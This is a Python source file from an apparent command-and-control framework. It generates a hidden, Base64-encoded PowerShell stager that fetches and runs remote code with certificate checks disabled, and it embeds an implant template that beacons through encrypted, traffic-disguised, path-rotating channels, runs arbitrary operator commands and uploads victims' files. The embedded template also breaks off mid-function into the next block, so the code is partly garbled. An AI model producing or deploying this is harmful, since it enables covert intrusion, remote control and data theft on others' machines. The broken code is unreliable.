import os
import base64
import json
import time

def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
    """
    Generate a Base64 encoded PowerShell agent stager
    
    Args:
        host: Server hostname or IP
        port: Server port
        ssl: Whether to use SSL/TLS
        campaign_folder: Path to the campaign folder
        
    Returns:
        String containing the generated PowerShell Base64 command
    """
    agents_folder = os.path.join(campaign_folder, "agents")
    os.makedirs(agents_folder, exist_ok=True)
    
    # Extract campaign name from folder path
    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
    
    # Get custom URL paths from url_paths.json if it exists
    url_paths_file = os.path.join(campaign_folder, "url_paths.json")
    url_paths = {
        "beacon_path": "/beacon",
        "agent_path": "/raw_agent",
        "stager_path": "/b64_stager",
        "cmd_result_path": "/command_result",
        "file_upload_path": "/file_upload"
    }
    
    if os.path.exists(url_paths_file):
        try:
            with open(url_paths_file, 'r') as f:
                custom_paths = json.load(f)
                url_paths.update(custom_paths)
        except Exception as e:
            print(f"Warning: Could not load URL paths: {e}")
    
    # Make sure all paths start with a leading slash
    for key in url_paths:
        if not url_paths[key].startswith('/'):
            url_paths[key] = '/' + url_paths[key]
    
    # Get the key information for documentation
    keys_file = os.path.join(campaign_folder, "keys.json")
    key_info = "Using campaign encryption key"
    key_base64 = None
    
    if os.path.exists(keys_file):
        try:
            with open(keys_file, 'r') as f:
                keys_data = json.load(f)
                key_base64 = keys_data.get("primary")
            key_info = f"Using encryption key from keys.json"
        except Exception as e:
            key_info = f"Warning: Error reading keys file: {e}"
            key_base64 = None
    
    if not key_base64:
        # Generate a random key if none exists
        key = os.urandom(32)  # 256-bit key
        key_base64 = base64.b64encode(key).decode('utf-8')
    
    http = "https" if ssl else "http"
    stager_path = url_paths["stager_path"]
    
    # Get agent configuration
    beacon_interval = 5  # Default
    jitter_percentage = 20  # Default
    max_failures = 3  # Default
    max_backoff = 300  # Default
    
    # Try to load agent config
    agent_config_file = os.path.join(campaign_folder, "agent_config.json")
    if os.path.exists(agent_config_file):
        try:
            with open(agent_config_file, 'r') as f:
                agent_config = json.load(f)
                beacon_interval = int(agent_config.get("beacon_period", beacon_interval))
                jitter_percentage = int(agent_config.get("jitter_percentage", jitter_percentage))
                max_failures = int(agent_config.get("max_failures_before_fallback", max_failures))
                max_backoff = int(agent_config.get("max_backoff_time", max_backoff))
        except Exception as e:
            print(f"Warning: Could not load agent config: {e}")
    
    # Read path rotation configuration
    rotation_enabled = True  # Default
    rotation_interval = 3600  # Default
    rotation_id = 0  # Default
    next_rotation_time = int(time.time()) + rotation_interval  # Default
    
    # Try to load path rotation state
    path_rotation_file = os.path.join(campaign_folder, "path_rotation_state.json")
    if os.path.exists(path_rotation_file):
        try:
            with open(path_rotation_file, 'r') as f:
                rotation_state = json.load(f)
                rotation_id = rotation_state.get("rotation_counter", 0)
                next_rotation_time = rotation_state.get("next_rotation_time", next_rotation_time)
                rotation_interval = rotation_state.get("rotation_interval", rotation_interval)
        except Exception as e:
            print(f"Warning: Could not load path rotation state: {e}")
    
    # Create the final agent from template
    template_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.template")
    path_rotation_template_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "path_rotation.template")
    
    # If templates don't exist yet, generate them from the current agent code
    if not os.path.exists(template_file) or not os.path.exists(path_rotation_template_file):
        create_template_files()
    
    # Load the template files
    try:
        with open(template_file, 'r') as f:
            agent_template = f.read()
        
        with open(path_rotation_template_file, 'r') as f:
            path_rotation_template = f.read()
    except Exception as e:
        print(f"Error loading templates: {e}")
        # Fall back to using the agent_generator.py function
        from utils.agent_generator import generate_agent_code
        return fallback_generate(host, port, ssl, key_base64, url_paths, campaign_folder)
    
    # Fill in the path rotation template
    path_rotation_code = path_rotation_template.replace("{{ROTATION_ID}}", str(rotation_id))
    path_rotation_code = path_rotation_code.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation_time))
    path_rotation_code = path_rotation_code.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
    path_rotation_code = path_rotation_code.replace("{{BEACON_PATH}}", url_paths["beacon_path"])
    path_rotation_code = path_rotation_code.replace("{{CMD_RESULT_PATH}}", url_paths["cmd_result_path"])
    path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", url_paths["file_upload_path"])
    
    # Fill in the agent template
    agent_code = agent_template.replace("{{KEY_BASE64}}", key_base64)
    agent_code = agent_code.replace("{{SERVER_ADDRESS}}", f"{host}:{port}")
    agent_code = agent_code.replace("{{BEACON_PATH}}", url_paths["beacon_path"])
    agent_code = agent_code.replace("{{CMD_RESULT_PATH}}", url_paths["cmd_result_path"]) 
    agent_code = agent_code.replace("{{FILE_UPLOAD_PATH}}", url_paths["file_upload_path"])
    agent_code = agent_code.replace("{{PATH_ROTATION_CODE}}", path_rotation_code if rotation_enabled else "")
    agent_code = agent_code.replace("{{BEACON_INTERVAL}}", str(beacon_interval))
    agent_code = agent_code.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
    agent_code = agent_code.replace("{{MAX_FAILURES}}", str(max_failures))
    agent_code = agent_code.replace("{{MAX_BACKOFF}}", str(max_backoff))
    
    # Create the Base64 stager
    base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{stager_path}');IEX($S)"
    
    # Add SSL certificate validation bypass if using SSL
    if ssl:
        agent = (
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
            "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
            "try {\n"
            f"    {base_agent}\n"
            "} catch {\n"
            "    $errorMessage = $_.Exception.Message\n"
            "    $errorDetails = $_ | Format-List -Force | Out-String\n"
            "    Write-Host \"Error connecting to C2: $errorMessage`n$errorDetails\"\n"
            "}"
        )
    else:
        agent = base_agent
    
    # Encode the stager
    encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
    powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
    
    # Save the full agent code to the agents folder
    agent_file_path = os.path.join(agents_folder, "powershell_agent.ps1")
    with open(agent_file_path, 'w') as f:
        f.write(agent_code)
    
    # Create a more detailed information about the agent
    details = (
        f"Powershell Base64 Agent Details:\n"
        f"1. Base Command: {powershell_command}\n"
        f"2. Encryption: {key_info}\n"
        f"3. System Identification: Full system identification enabled\n"
        f"4. SSL Validation: {'Certificate validation bypassed (required for self-signed certs)' if ssl else 'No SSL used'}\n"
        f"5. Communication Paths:\n"
        f"   - Beacon URL: {http}://{host}:{port}{url_paths['beacon_path']}\n"
        f"   - Agent Download URL: {http}://{host}:{port}{url_paths['agent_path']}\n"
        f"   - Stager URL: {http}://{host}:{port}{url_paths['stager_path']}\n"
        f"   - Command Result URL: {http}://{host}:{port}{url_paths['cmd_result_path']}\n"
        f"   - File Upload URL: {http}://{host}:{port}{url_paths['file_upload_path']}\n"
        f"6. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
        f"7. Headers: Legitimate web browsing headers included\n"
        f"8. Error Handling: Enhanced error reporting enabled\n"
        f"9. Beacon Configuration:\n"
        f"   - Interval: {beacon_interval} seconds\n"
        f"   - Jitter: {jitter_percentage}%\n"
        f"   - Path Rotation: {'Enabled' if rotation_enabled else 'Disabled'}\n"
        f"   - Rotation Interval: {rotation_interval} seconds\n"
    )
    
    details_file_path = os.path.join(agents_folder, "powershell_base64.txt")
    with open(details_file_path, 'w') as f:
        f.write(details)
    
    result = f"Powershell Base64:\n{powershell_command}\n\nEncryption: {key_info}\nIdentity: Full system identification enabled"
    
    return f"Powershell Base64 agent generated and saved to {details_file_path}\n{result}"

def create_template_files():
    """Create the template files if they don't exist yet"""
    template_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Create the agent template
    agent_template_file = os.path.join(template_dir, "agent.template")
    path_rotation_template_file = os.path.join(template_dir, "path_rotation.template")
    
    # Make sure the directory exists
    os.makedirs(template_dir, exist_ok=True)
    
    # Check if templates already exist
    if os.path.exists(agent_template_file) and os.path.exists(path_rotation_template_file):
        return
    
    # Create the agent template from the embedded template
    with open(agent_template_file, 'w') as f:
        f.write("""# Kinetic Compliance Matrix - PowerShell Agent with Dynamic Path Rotation
# This agent contains encryption functionality, system identification, and path rotation

# Set TLS 1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Encryption key
$key = [System.Convert]::FromBase64String('{{KEY_BASE64}}')

# Server details
$serverAddress = '{{SERVER_ADDRESS}}'

# Initial endpoint paths
$beaconPath = '{{BEACON_PATH}}'
$commandResultPath = '{{CMD_RESULT_PATH}}'
$fileUploadPath = '{{FILE_UPLOAD_PATH}}'

{{PATH_ROTATION_CODE}}

# Function to encrypt data for C2 communication
function Encrypt-Data {
    param([string]$PlainText)
    
    # Convert to bytes
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    
    # Generate random IV
    $iv = New-Object byte[] 16
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($iv)
    
    # Add padding
    $blockSize = 16
    $paddingLength = $blockSize - ($bytes.Length % $blockSize)
    $paddedBytes = New-Object byte[] ($bytes.Length + $paddingLength)
    [Array]::Copy($bytes, $paddedBytes, $bytes.Length)
    
    # Fill padding bytes
    for ($i = $bytes.Length; $i -lt $paddedBytes.Length; $i++) {
        $paddedBytes[$i] = [byte]$paddingLength
    }
    
    # Encrypt
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($paddedBytes, 0, $paddedBytes.Length)
    
    # Combine IV and encrypted bytes
    $result = New-Object byte[] ($iv.Length + $encryptedBytes.Length)
    [Array]::Copy($iv, 0, $result, 0, $iv.Length)
    [Array]::Copy($encryptedBytes, 0, $result, $iv.Length, $encryptedBytes.Length)
    
    # Return Base64
    return [System.Convert]::ToBase64String($result)
}

# Function to decrypt data from C2 communication
function Decrypt-Data {
    param([string]$EncryptedBase64)
    
    # Decode base64
    $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
    
    # Extract IV and ciphertext
    $iv = $encryptedBytes[0..15]
    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length-1)]
    
    # Create AES decryptor
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $key
    $aes.IV = $iv
    
    # Decrypt
    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    
    # Remove padding
    $paddingLength = $decryptedBytes[$decryptedBytes.Length-1]
    $unpaddedBytes = $decryptedBytes[0..($decryptedBytes.Length-$paddingLength-1)]
    
    # Convert to string
    return [System.Text.Encoding]::UTF8.GetString($unpaddedBytes)
}

# Function to gather system identification information
function Get-SystemIdentification {
    # Gather system identification information
    $systemInfo = @{
        Hostname = [System.Net.Dns]::GetHostName()
        Username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        OsVersion = [System.Environment]::OSVersion.VersionString
        Architecture = if ([System.Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
        ProcessorCount = [System.Environment]::ProcessorCount
        TotalMemory = (Get-CimInstance -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    }
    
    # Generate a unique client identifier (will be used later for re-registration)
    $clientId = [Guid]::NewGuid().ToString()
    $systemInfo.ClientId = $clientId
    
    # Get Machine GUID - this is a relatively stable identifier
    try {
        $machineGuid = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Cryptography" -Name "MachineGuid" -ErrorAction Stop).MachineGuid
        $systemInfo.MachineGuid = $machineGuid
    } catch {
        $systemInfo.MachineGuid = "Unknown"
    }
    
    # Get MAC address of first network adapter
    try {
        $networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
        if ($networkAdapters) {
            $systemInfo.MacAddress = $networkAdapters[0].MACAddress
        } else {
            $systemInfo.MacAddress = "Unknown"
        }
    } catch {
        $systemInfo.MacAddress = "Unknown"
    }
    
    # Get domain information
    try {
        $computerSystem = Get-CimInstance Win32_ComputerSystem
        $systemInfo.Domain = $computerSystem.Domain
        $systemInfo.PartOfDomain = $computerSystem.PartOfDomain
    } catch {
        $systemInfo.Domain = "Unknown"
        $systemInfo.PartOfDomain = $false
    }
    
    # Add rotation information if enabled
    if ($global:pathRotationEnabled) {
        $systemInfo.RotationId = $global:currentRotationId
    }
    
    # Convert to JSON
    $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
    return $jsonInfo
}

# Function to process commands from the C2 server
function Process-Commands {
    param([array]$Commands)
    
    if (-not $Commands -or $Commands.Count -eq 0) {
        return
    }
    
    # Process each command
    foreach ($command in $Commands) {
        $timestamp = $command.timestamp
        $commandType = $command.command_type
        $args = $command.args
        
        # Execute based on command type
        try {
            $result = ""
            
            if ($commandType -eq "execute") {
                # Execute shell command
                $result = Invoke-Expression -Command $args | Out-String
            }
            elseif ($commandType -eq "upload") {
                # Upload file from client to server
                if (Test-Path -Path $args) {
                    $fileName = Split-Path -Path $args -Leaf
                    $fileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($args))
                    
                    $fileInfo = @{
                        FileName = $fileName
                        FileContent = $fileContent
                    }
                    
                    $fileInfoJson = ConvertTo-Json -InputObject $fileInfo -Compress
                    $encryptedFileInfo = Encrypt-Data -PlainText $fileInfoJson
                    
                    # Get current file upload path
                    $uploadPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "file_upload_path" } else { $fileUploadPath }
                    $uploadUrl = "http://$serverAddress$uploadPath"
                    
                    $uploadClient = New-Object System.Net.WebClient
                    $systemInfo = Get-SystemIdentification
                    $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
                    $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
                    
                    $uploadClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
                    $uploadClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
                    if ($global:pathRotationEnabled) {
                        $uploadClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
                    }
                    $uploadClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
                    $uploadClient.Headers.Add("Content-Type", "application/json")
                    $uploadClient.UploadString($uploadUrl, $encryptedFileInfo)
                    
                    $result = "File uploaded: $fileName"
                } else {
                    $result = "Error: File not found - $args"
                }
            }
            elseif ($commandType -eq "system_info") {
                # Return detailed system information
                $detailedInfo = Get-SystemIdentification
                $result = $detailedInfo
            }
            elseif ($commandType -eq "key_rotation") {
                # Handle key rotation command from operator
                # Get the new key from args
                try {
                    $newKey = [System.Convert]::FromBase64String($args)
                    $global:key = $newKey
                    $result = "Key rotation successful - using new encryption key"
                }
                catch {
                    $result = "Key rotation failed: $_"
                }
            }
            elseif ($commandType -eq "path_rotation") {
                # Handle path rotation command
                try {
                    $rotationArgs = ConvertFrom-Json -InputObject $args
                    $rotationId = $rotationArgs.rotation_id
                    $nextRotationTime = $rotationArgs.next_rotation_time
                    $paths = $rotationArgs.paths
                    
                    Update-PathRotation -RotationId $rotationId -NextRotationTime $nextRotationTime -Paths $paths
                    $result = "Path rotation updated: ID $rotationId, next rotation at $([DateTimeOffset]::FromUnixTimeSeconds($nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
                }
                catch {
                    $result = "Path rotation failed: $_"
                }
            }
            else {
                $result = "Unknown command type: $commandType"
            }
            
            # Send the result back to C2
            $resultObj = @{
                timestamp = $timestamp
                result = $result
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-Object System.Net.WebClient
            $systemInfo = Get-SystemIdentification
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
            
            $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
            if ($global:pathRotationEnabled) {
                $resultClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
            }
            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $resultClient.Headers.Add("Content-Type", "application/json")
            $resultClient.UploadString($resultUrl, $encryptedResult)
        }
        catch {
            # Send the error as a result
            $resultObj = @{
                timestamp = $timestamp
                result = "Error executing command: $_"
            }
            
            $resultJson = ConvertTo-Json -InputObject $resultObj -Compress
            $encryptedResult = Encrypt-Data -PlainText $resultJson
            
            # Get current command result path
            $cmdResultPath = if ($global:pathRotationEnabled) { Get-CurrentPath -PathType "cmd_result_path" } else { $commandResultPath }
            $resultUrl = "http://$serverAddress$cmdResultPath"
            
            $resultClient = New-Object System.Net.WebClient
            $systemInfo = Get-SystemIdentification
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
            
            $resultClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            $resultClient.Headers.Add("X-Client-ID", $systemInfoObj.ClientId)
            if ($global:pathRotationEnabled) {
                $resultClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
            }
            $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $resultClient.Headers.Add("Content-Type", "application/json")
            $resultClient.UploadString($resultUrl, $encryptedResult)
        }
    }
}

# Function to check rotation times
function Check-PathRotation {
    $currentTime = [int][double]::Parse((Get-Date -UFormat %s))
    
    # Check if we're past rotation time
    if ($global:pathRotationEnabled -and $currentTime -ge $global:nextRotationTime) {
        # We need to get rotations info from server ASAP
        # Will be handled on next beacon
        Write-Host "Rotation time reached, waiting for update from server..."
    }
}

# Function to handle server response headers and update rotation info
function Process-ServerResponseHeaders {
    param($WebClient)
    
    # Check for rotation information in headers
    if ($global:pathRotationEnabled) {
        $rotationId = $WebClient.ResponseHeaders["X-Rotation-ID"]
        $nextRotation = $WebClient.ResponseHeaders["X-Next-Rotation"]
        
        if ($rotationId -and [int]$rotationId -ne $global:currentRotationId) {
            # Server has newer rotation, we need to get paths
            Write-Host "Server has newer rotation ID: $rotationId (current: $global:currentRotationId)"
            $global:currentRotationId = [int]$rotationId
        }
        
        if ($nextRotation -and [int]$nextRotation -ne $global:nextRotationTime) {
            $global:nextRotationTime = [int]$nextRotation
            Write-Host "Next rotation time updated: $([DateTimeOffset]::FromUnixTimeSeconds($global:nextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss'))"
        }
    }
}

# Main agent loop
function Start-AgentLoop {
    $beaconInterval = {{BEACON_INTERVAL}}  # Seconds
    $jitterPercentage = {{JITTER_PERCENTAGE}}  # +/- percentage to randomize beacon timing
    
    # Get system information for identification
    $systemInfo = Get-SystemIdentification
    
    # Consistent client ID for this instance
    $systemInfoObj = ConvertFrom-Json -InputObject $systemInfo
    $clientId = $systemInfoObj.ClientId
    $hostname = $systemInfoObj.Hostname
    
    # Track failed connection attempts for fallback
    $consecutiveFailures = 0
    $maxFailuresBeforeFallback = {{MAX_FAILURES}}
    
    # Boolean to track if we're using fallback paths
    $usingFallbackPaths = $false
    
    while ($true) {
        try {
            # Check if rotation time has passed but we haven't got new paths yet
            Check-PathRotation
            
            # Add jitter to beacon interval
            $jitterFactor = 1 + (Get-Random -Minimum (-$jitterPercentage) -Maximum $jitterPercentage) / 100
            $actualInterval = $beaconInterval * $jitterFactor
            
            # Create web client for C2 communication
            $webClient = New-Object System.Net.WebClient
            
            # Add system info in encrypted form
            $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfo
            $webClient.Headers.Add("X-System-Info", $encryptedSystemInfo)
            
            # Add client ID
            $webClient.Headers.Add("X-Client-ID", $clientId)
            
            # Add current rotation ID if path rotation is enabled
            if ($global:pathRotationEnabled) {
                $webClient.Headers.Add("X-Rotation-ID", $global:currentRotationId)
            }
            
            # Add legitimate-looking headers to blend in with normal web traffic
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
            $webClient.Headers.Add("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
            $webClient.Headers.Add("Accept-Language", "en-US,en;q=0.5")
            
            # Get current beacon path based on rotation status
            $currentBeaconPath = if ($global:pathRotationEnabled -and -not $usingFallbackPaths) { 
                Get-CurrentPath -PathType "beacon_path" 
            } else { 
                $beaconPath 
            }
            $beaconUrl = "http://$serverAddress$currentBeaconPath"
            
            # Beacon to the C2 server
            Write-Host "[$hostname] Beaconing to $beaconUrl"
            $encryptedResponse = $webClient.DownloadString($beaconUrl)
            
            # Process response headers for path rotation updates
            Process-ServerResponseHeaders -WebClient $webClient
            
            # Reset failure counter on successful connection
            $consecutiveFailures = 0
            $usingFallbackPaths = $false
            
            # Decrypt and process response if not empty
            if ($encryptedResponse.Length -gt 0) {
                $decryptedResponse = Decrypt-Data -EncryptedBase64
                # Create the path rotation template
    with open(path_rotation_template_file, 'w') as f:
        f.write("""# Path rotation configuration
$global:pathRotationEnabled = $true
$global:currentRotationId = {{ROTATION_ID}}
$global:nextRotationTime = {{NEXT_ROTATION_TIME}}
$global:rotationInterval = {{ROTATION_INTERVAL}}

# Store initial paths
$global:initialPaths = @{
    "beacon_path" = "{{BEACON_PATH}}";
    "cmd_result_path" = "{{CMD_RESULT_PATH}}";
    "file_upload_path" = "{{FILE_UPLOAD_PATH}}";
}

# Store current paths
$global:currentPaths = $global:initialPaths.Clone()

# Function to handle path rotation updates from server
function Update-PathRotation {
    param(
        [int]$RotationId,
        [int]$NextRotationTime,
        [hashtable]$Paths
    )
    
    $global:currentRotationId = $RotationId
    $global:nextRotationTime = $NextRotationTime
    
    # Update paths if provided
    if ($Paths) {
        $global:currentPaths = @{}
        foreach ($key in $Paths.Keys) {
            $global:currentPaths[$key] = $Paths[$key]
        }
    }
    
    # Log the rotation
    $nextTime = [DateTimeOffset]::FromUnixTimeSeconds($NextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Host "Path rotation updated: ID $RotationId, next rotation at $nextTime"
}

# Function to get the current path by type
function Get-CurrentPath {
    param([string]$PathType)
    
    if ($global:currentPaths.ContainsKey($PathType)) {
        return $global:currentPaths[$PathType]
    }
    
    # Fallback to initial paths if not found
    if ($global:initialPaths.ContainsKey($PathType)) {
        return $global:initialPaths[$PathType]
    }
    
    # Default fallback paths
    switch ($PathType) {
        "beacon_path" { return "/beacon" }
        "cmd_result_path" { return "/command_result" }
        "file_upload_path" { return "/file_upload" }
        default { return "/$PathType" }
    }
}
""")

def fallback_generate(host, port, ssl, key_base64, url_paths, campaign_folder):
    """
    Fallback method to generate agent code if template files can't be loaded
    This calls the original agent_generator function
    """
    try:
        # Try to import the original generate_agent_code function
        from utils.agent_generator import generate_agent_code
        
        # Get path rotation info
        path_rotation_file = os.path.join(campaign_folder, "path_rotation_state.json")
        rotation_info = None
        
        if os.path.exists(path_rotation_file):
            try:
                with open(path_rotation_file, 'r') as f:
                    rotation_info = json.load(f)
            except Exception as e:
                print(f"Warning: Could not load path rotation state: {e}")
        
        # Call the original function
        agent_code = generate_agent_code(
            key_base64,
            f"{host}:{port}",
            beacon_path=url_paths.get("beacon_path", "/beacon"),
            cmd_result_path=url_paths.get("cmd_result_path", "/command_result"),
            file_upload_path=url_paths.get("file_upload_path", "/file_upload"),
            rotation_info=rotation_info
        )
        
        # Create the Base64 stager
        http = "https" if ssl else "http"
        stager_path = url_paths.get("stager_path", "/b64_stager")
        
        base_agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{stager_path}');IEX($S)"
        
        # Add SSL certificate validation bypass if using SSL
        if ssl:
            agent = (
                "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\n"
                "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n"
                "try {\n"
                f"    {base_agent}\n"
                "} catch {\n"
                "    $errorMessage = $_.Exception.Message\n"
                "    $errorDetails = $_ | Format-List -Force | Out-String\n"
                "    Write-Host \"Error connecting to C2: $errorMessage`n$errorDetails\"\n"
                "}"
            )
        else:
            agent = base_agent
        
        encoded = base64.b64encode(agent.encode("UTF-8")).decode("UTF-8")
        powershell_command = f"powershell -w hidden \"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{encoded}')))\""
        
        # Generate basic details
        details = f"Powershell Base64 agent generated using fallback method\nCommand: {powershell_command}"
        
        return details
        
    except Exception as e:
        print(f"Error in fallback agent generation: {e}")
        # Last resort fallback
        return f"Error generating agent: {e}"